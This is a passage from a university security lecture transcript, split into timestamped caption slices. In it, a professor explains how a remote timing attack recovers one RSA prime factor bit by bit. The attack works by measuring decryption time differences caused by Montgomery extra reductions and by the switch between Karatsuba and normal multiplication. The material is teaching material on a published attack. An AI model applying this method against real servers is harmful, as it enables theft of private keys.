              <time_slice>1:06:19</time_slice>
              <text_slice>to the d mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:23</time_slice>
              <text_slice>And we get c to
the d here, we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>going to get to c to the d
mod p on the bottom version</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:28</time_slice>
              <text_slice>of this pipeline.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:29</time_slice>
              <text_slice>And we can use CRT to get the
value of c to the d mod m.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:35</time_slice>
              <text_slice>Sorry for the small
type here, or font size.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:38</time_slice>
              <text_slice>But roughly it's the same
thing we're expecting here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:40</time_slice>
              <text_slice>We can finally get our result.
And we get our message, m.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:44</time_slice>
              <text_slice>So the server takes
an incoming packet</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:46</time_slice>
              <text_slice>that it gets, runs it
through this whole pipeline,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:51</time_slice>
              <text_slice>does two parts of
this pipeline, ends up</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:53</time_slice>
              <text_slice>with a decrypted message m
that's equal c to the d mod m.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:57</time_slice>
              <text_slice>And then it's going to check
the padding of this message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:00</time_slice>
              <text_slice>And in this particular
attack, because we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:02</time_slice>
              <text_slice>going to carefully
construct this value c,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:05</time_slice>
              <text_slice>the padding is going to
actually not match up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:07</time_slice>
              <text_slice>We're going to choose
the value c according</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:10</time_slice>
              <text_slice>to some other
heuristics that aren't</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:12</time_slice>
              <text_slice>encrypting a real message
with the correct padding.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:14</time_slice>
              <text_slice>So the padding is going to be
a mismatch, and the server's</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:17</time_slice>
              <text_slice>going to need it to record
an error back to the client.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:19</time_slice>
              <text_slice>[? And it pulls ?]
the connection.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:22</time_slice>
              <text_slice>And that's the time
that we're going</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:23</time_slice>
              <text_slice>to measure to figure out how
long this whole pipeline took.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:28</time_slice>
              <text_slice>Makes sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:29</time_slice>
              <text_slice>Questions about this
pipeline and putting</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:31</time_slice>
              <text_slice>all the optimizations together?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:34</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:41</time_slice>
              <text_slice>PROFESSOR: Yeah,
you're probably right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:43</time_slice>
              <text_slice>Yes, c1 to the d, c0 to the d.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:45</time_slice>
              <text_slice>Yeah, this is c0.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:46</time_slice>
              <text_slice>Yeah, correct.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:49</time_slice>
              <text_slice>AUDIENCE: When you
divide by r [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:51</time_slice>
              <text_slice>isn't there a
[INAUDIBLE] on how many</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:55</time_slice>
              <text_slice>q's you have to have to get
the [? little bit ?] to be</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:00</time_slice>
              <text_slice>0? [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:03</time_slice>
              <text_slice>PROFESSOR: Yeah, so there
might be extra reductions</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:05</time_slice>
              <text_slice>in this final phase as well.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:07</time_slice>
              <text_slice>You're right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:07</time_slice>
              <text_slice>So potentially, we have do
this divide by R correctly.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:11</time_slice>
              <text_slice>So we probably have to
do exactly the same thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:13</time_slice>
              <text_slice>as we saw for the
Montgomery reductions here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:16</time_slice>
              <text_slice>When we do this divide
by R to convert it back.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:19</time_slice>
              <text_slice>So it's not clear exactly
how many qs we should add.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:22</time_slice>
              <text_slice>We should figure out how many
qs to add, add that many,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:25</time_slice>
              <text_slice>kill the low zeros, and
then do mod q again,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:28</time_slice>
              <text_slice>maybe an extra reduction.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:29</time_slice>
              <text_slice>You're absolutely
right, this is exactly</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:31</time_slice>
              <text_slice>the same kind of
divide by R mod q</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:33</time_slice>
              <text_slice>as we do for every Montgomery
multiplication step.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:38</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:40</time_slice>
              <text_slice>Any other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:43</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:44</time_slice>
              <text_slice>So how do you exploit this?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:45</time_slice>
              <text_slice>How does an attacker
actually figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:47</time_slice>
              <text_slice>what the secret
key of the server</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:49</time_slice>
              <text_slice>is by measuring the time
of this entire pipeline?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:54</time_slice>
              <text_slice>So these guys have a
plan that basically</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:58</time_slice>
              <text_slice>involves guessing one bit of
the private key at a time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:03</time_slice>
              <text_slice>And what they mean actually
by guessing the private key is</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:07</time_slice>
              <text_slice>that you might think the private
key is this encryption exponent</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:10</time_slice>
              <text_slice>d, because actually
you know e, you</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:13</time_slice>
              <text_slice>know n, that's the public key.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:15</time_slice>
              <text_slice>The only think you
don't know is d.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:16</time_slice>
              <text_slice>But in fact, in this attack
they don't go for the exponent d</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:19</time_slice>
              <text_slice>directly, that's a little
bit harder to guess.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:21</time_slice>
              <text_slice>Instead, what
they're going to go</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:23</time_slice>
              <text_slice>for is the value
q or the value p,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:25</time_slice>
              <text_slice>doesn't really matter which one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:27</time_slice>
              <text_slice>Once you guess what the
value p or q is, then</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:31</time_slice>
              <text_slice>you can give an n, you can
factor in the p times q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:34</time_slice>
              <text_slice>Then if you know p times
q, you can actually--</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:37</time_slice>
              <text_slice>sorry-- if you know
the values of p and q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:39</time_slice>
              <text_slice>you can compute that phi
function we saw before.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:41</time_slice>
              <text_slice>That's going to allow you to get
the value d from the value e.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:45</time_slice>
              <text_slice>So this factorization of the
value m is hugely important,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:48</time_slice>
              <text_slice>it should be secret for
RSA to remain secure.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:51</time_slice>
              <text_slice>So these guys are
actually going to go</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:53</time_slice>
              <text_slice>and try to guess
what the value of q</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:55</time_slice>
              <text_slice>is by timing this pipeline.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:59</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:00</time_slice>
              <text_slice>So how do these
guys actually do it?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:02</time_slice>
              <text_slice>Well, they construct
carefully chosen inputs, c,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:10</time_slice>
              <text_slice>into this pipeline
and-- I guess I</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:12</time_slice>
              <text_slice>keep saying they keep measuring
the time for this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:16</time_slice>
              <text_slice>But the particular,
well, there's</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:22</time_slice>
              <text_slice>two parts of the
attack, you have</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:23</time_slice>
              <text_slice>to bootstrap it a little bit to
guess the first couple of bits.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:26</time_slice>
              <text_slice>And then once you have
the first couple of bits,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:28</time_slice>
              <text_slice>you can I guess the next bit.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:29</time_slice>
              <text_slice>So let me not say
exactly how they</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:31</time_slice>
              <text_slice>guess the first couple of bits
because it's actually much more</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:34</time_slice>
              <text_slice>interesting to see how
they guess the next bit.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:36</time_slice>
              <text_slice>And then we'll come
back if we have</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:38</time_slice>
              <text_slice>time to look at how they
guess the first couple of bits</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:40</time_slice>
              <text_slice>[? at this ?] in the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:41</time_slice>
              <text_slice>But basically, suppose you
have a guess g about what</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:45</time_slice>
              <text_slice>the bits are of this value q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:48</time_slice>
              <text_slice>So you know that q has some
bits, g0, g1, g2, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:56</time_slice>
              <text_slice>And actually, I guess
these are not even gs,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:01</time_slice>
              <text_slice>these are real q bits, so
let me write it as that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:04</time_slice>
              <text_slice>So you know tat q bit
0 q bit 1, q bit 2,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:10</time_slice>
              <text_slice>these are the highest bits of q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:12</time_slice>
              <text_slice>And then you're trying to
guess lower and lower bits.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:15</time_slice>
              <text_slice>So suppose you know the
value of q up to bit j.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:20</time_slice>
              <text_slice>And from that point on, your
guess is actually all 0.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:22</time_slice>
              <text_slice>You have no idea what
the other bits are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:26</time_slice>
              <text_slice>So these guys are going
to try to get this guess</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:31</time_slice>
              <text_slice>g into this place
in the pipeline.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:35</time_slice>
              <text_slice>Because this is where
there are two tiny effects:</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:38</time_slice>
              <text_slice>this choice of Karatsuba
versus normal multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:41</time_slice>
              <text_slice>And this choice of, or
this a different number</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:44</time_slice>
              <text_slice>of extra reductions depending
on the value c0 prime.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:48</time_slice>
              <text_slice>Sp they're going to actually
try to get two different guess</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:51</time_slice>
              <text_slice>values into that
place in the pipeline.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:53</time_slice>
              <text_slice>One that looks like this,
and one that they call</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:58</time_slice>
              <text_slice>g high, which is all the
same high bits, q2 qj.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:05</time_slice>
              <text_slice>And for the next bit,
which they don't know,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:07</time_slice>
              <text_slice>[? you ?] guess g
is going to have 0,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:09</time_slice>
              <text_slice>g high is going to have a bit
1 here and all zeros later on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:14</time_slice>
              <text_slice>So how does it help these guys
figure out what's going on?</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:19</time_slice>
              <text_slice>So there are really two
ways you can think of it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:22</time_slice>
              <text_slice>Suppose that we get this guess
g to be the value of c0 prime.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:28</time_slice>
              <text_slice>We can think of g and g high
being the c0 prime value</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:34</time_slice>
              <text_slice>on that left board over there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:36</time_slice>
              <text_slice>It's actually fairly
straightforward</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:37</time_slice>
              <text_slice>to do this because c0 prime
is pretty deterministically</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:42</time_slice>
              <text_slice>computed from the
input ciphertext c0.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:44</time_slice>
              <text_slice>You just multiply it
by R. So, in order</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:47</time_slice>
              <text_slice>for them to get
some value to here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:49</time_slice>
              <text_slice>as a guess, they just
need to take their guess</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:53</time_slice>
              <text_slice>and first divide it by R, so
divide it by 2 to the 512 mod</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:57</time_slice>
              <text_slice>something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:58</time_slice>
              <text_slice>And then, they're going
to inject it back.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:01</time_slice>
              <text_slice>And the server's going
to multiply it by R,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:04</time_slice>
              <text_slice>and then off you go.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:06</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:07</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:09</time_slice>
              <text_slice>So suppose that we manage to get
our particular chosen integer</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:13</time_slice>
              <text_slice>value into that c0
you're prime spot.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:16</time_slice>
              <text_slice>So what's going to be
the time to compute</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:19</time_slice>
              <text_slice>c0 prime to the d mod q?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:22</time_slice>
              <text_slice>So there are two possible
options here where</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:26</time_slice>
              <text_slice>q falls in this picture.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:28</time_slice>
              <text_slice>So it might be that q is
between these two values.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:33</time_slice>
              <text_slice>Because the next bit of q is 0.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:37</time_slice>
              <text_slice>So this value is going
to be less than q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:39</time_slice>
              <text_slice>but this guy's going
to be greater than q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:41</time_slice>
              <text_slice>So this happens if the
next bit of q0 or it</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:44</time_slice>
              <text_slice>might be that q lies
above both of these values</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:48</time_slice>
              <text_slice>if the next bit of q is 1.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:51</time_slice>
              <text_slice>So now we can tell,
OK, what's going</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:53</time_slice>
              <text_slice>to be the timing of
decrypting these two values,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:58</time_slice>
              <text_slice>if q lies in between them, or
if q lies above both of them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:04</time_slice>
              <text_slice>Let's look at the
situation where</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:05</time_slice>
              <text_slice>q lies above both of them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:08</time_slice>
              <text_slice>Well in that case,
actually everything</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:11</time_slice>
              <text_slice>is pretty much the same.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:13</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:13</time_slice>
              <text_slice>Because both of these
values are smaller than q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:16</time_slice>
              <text_slice>then the value of
these things mod q</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:18</time_slice>
              <text_slice>is going to be roughly the same.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:19</time_slice>
              <text_slice>They're going to be a
little bit different</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:21</time_slice>
              <text_slice>because this extra bit,
but more or less they're</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:24</time_slice>
              <text_slice>the same magnitude.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:26</time_slice>
              <text_slice>And the number of
extractor reductions</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:28</time_slice>
              <text_slice>is also probably not going to
be hugely different because it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:31</time_slice>
              <text_slice>proportional to the
value of this guy mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:34</time_slice>
              <text_slice>And for both these guys, they're
both a little bit smaller</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:37</time_slice>
              <text_slice>than q, so they're
all about the same.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:40</time_slice>
              <text_slice>Neither of them is going to
exceed q and all of a sudden</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:43</time_slice>
              <text_slice>have [? many or fewer ?]
extra reductions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:46</time_slice>
              <text_slice>So if q is greater than
both of these guesses</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:49</time_slice>
              <text_slice>then Karatsuba versus normal
is going to stay the same.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:52</time_slice>
              <text_slice>The server is going to do
the same thing basically</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:54</time_slice>
              <text_slice>for both g and g high in terms
of Karatsuba versus normal.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:56</time_slice>
              <text_slice>And the server's going to
do about the same number</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:59</time_slice>
              <text_slice>of extra reductions for
both these guys as well.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:01</time_slice>
              <text_slice>So If you see that the server's
taking the same amount of time</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:04</time_slice>
              <text_slice>to respond to these
guesses, then you</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:06</time_slice>
              <text_slice>should probably guess that, oh,
q probably has the bit 1 here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:10</time_slice>
              <text_slice>On the other hand, if
q lies in the middle,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:12</time_slice>
              <text_slice>then there are two
possible things</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:14</time_slice>
              <text_slice>that could trigger a
change in the timing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:17</time_slice>
              <text_slice>One possibility is
that because g high</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:19</time_slice>
              <text_slice>is just a little
bit larger than q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:22</time_slice>
              <text_slice>then the number of
extra reductions</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:24</time_slice>
              <text_slice>is going to be proportional
to this guy mod q, which</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:26</time_slice>
              <text_slice>is very small because
c0 prime is q plus just</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:31</time_slice>
              <text_slice>a little bit in
these extra bits.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:33</time_slice>
              <text_slice>So the number of
extra reductions</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:35</time_slice>
              <text_slice>is going to [? flaunt it ?].</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:36</time_slice>
              <text_slice>And all of a sudden,
it will be faster.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:39</time_slice>
              <text_slice>Another possible
thing that can happen</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:40</time_slice>
              <text_slice>is that maybe the
server will decide, oh,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:42</time_slice>
              <text_slice>now it's time to do normal
multiplication instead</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:44</time_slice>
              <text_slice>of Karatsuba.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:45</time_slice>
              <text_slice>Maybe for this value,
all these, c to the 0</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:51</time_slice>
              <text_slice>prime was the same
number of bits as q</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:55</time_slice>
              <text_slice>if it turns out that
g high is above q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:58</time_slice>
              <text_slice>then g high mod q is potentially
going to have fewer bits.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:02</time_slice>
              <text_slice>And if this crosses the
[INAUDIBLE] boundary,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:04</time_slice>
              <text_slice>then the server's going to
do normal multiplication</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:07</time_slice>
              <text_slice>all of a sudden.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:08</time_slice>
              <text_slice>So that's going to be
in the other direction.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:10</time_slice>
              <text_slice>So if you cross over, then
normal multiplication kicks in,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:14</time_slice>
              <text_slice>and things get a lot slower
because normal multiplication</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:16</time_slice>
              <text_slice>is quadratic instead of
nicer, faster Karatsuba.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:20</time_slice>
              <text_slice>Question.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:21</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:23</time_slice>
              <text_slice>PROFESSOR: Yeah, because the
number of extra reductions</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:26</time_slice>
              <text_slice>is proportional to from above
there to c0 prime mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:31</time_slice>
              <text_slice>So if c0 prime, which is this
value, is just a little over q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:36</time_slice>
              <text_slice>Then, this is tiny, as opposed
to this guy who's basically</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:40</time_slice>
              <text_slice>the same as q, or all the
high bits are the same as q,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:43</time_slice>
              <text_slice>and then it's big.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:44</time_slice>
              <text_slice>So then it'll be the difference
that you can try to measure.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:47</time_slice>
              <text_slice>So this is one interesting
thing, actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:49</time_slice>
              <text_slice>a couple interesting
things, these effects</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:51</time_slice>
              <text_slice>actually work in different
directions, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:53</time_slice>
              <text_slice>So if you hit a 32 bit
boundary and Karatsuba</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:55</time_slice>
              <text_slice>versus normal switches,
then all of a sudden</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:58</time_slice>
              <text_slice>it takes much longer to
decrypt this message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:00</time_slice>
              <text_slice>On the other hand, if it's
not a 32 bit boundary,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:04</time_slice>
              <text_slice>maybe this effect will
tell you what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:07</time_slice>
              <text_slice>So you actually have to
watch for different effects.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:09</time_slice>
              <text_slice>If you're not guessing a bit
that's a multiple of 32 bits,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:13</time_slice>
              <text_slice>then you should
probably expect the time</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:15</time_slice>
              <text_slice>to drop because of
extra reductions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:18</time_slice>
              <text_slice>On the other hand,
if you're trying</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:19</time_slice>
              <text_slice>to guess a bit that's
a multiple of 32, then</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:22</time_slice>
              <text_slice>maybe you should be expecting
for it to jump a lot</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:25</time_slice>
              <text_slice>or maybe drop if it's
[INAUDIBLE] normal.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:27</time_slice>
              <text_slice>So I guess what these
guys look at in the paper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:29</time_slice>
              <text_slice>this actually
doesn't really matter</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:31</time_slice>
              <text_slice>whether there's a jump up
or a jump down in time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:34</time_slice>
              <text_slice>You should just expect if q
is, if the next bit of q is 1,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:38</time_slice>
              <text_slice>you should expect
these things to take</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:40</time_slice>
              <text_slice>almost the same amount of time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:41</time_slice>
              <text_slice>And if the next bit
of q is 0, then you</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:44</time_slice>
              <text_slice>should expect these guys to
have a noticeable difference</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:46</time_slice>
              <text_slice>even if it's big or small, even
if it's positive or negative.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:51</time_slice>
              <text_slice>So actually, they measure this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:53</time_slice>
              <text_slice>And it turns out to
actually work pretty well.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:55</time_slice>
              <text_slice>They have to do actually
two interesting tricks</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:57</time_slice>
              <text_slice>to make this work out.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:58</time_slice>
              <text_slice>If you remember the timing
difference was tiny,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:01</time_slice>
              <text_slice>it's an order of 1
to 2 microseconds.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:05</time_slice>
              <text_slice>So it's going to be hard to
measure this over a network,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:07</time_slice>
              <text_slice>over an ethernet
switch for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:10</time_slice>
              <text_slice>What they do is they actually
do two kinds of measurements,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:13</time_slice>
              <text_slice>two kinds of averaging.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:15</time_slice>
              <text_slice>So for each guess
that they send,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:17</time_slice>
              <text_slice>they actually send
it several times.</text_slice>
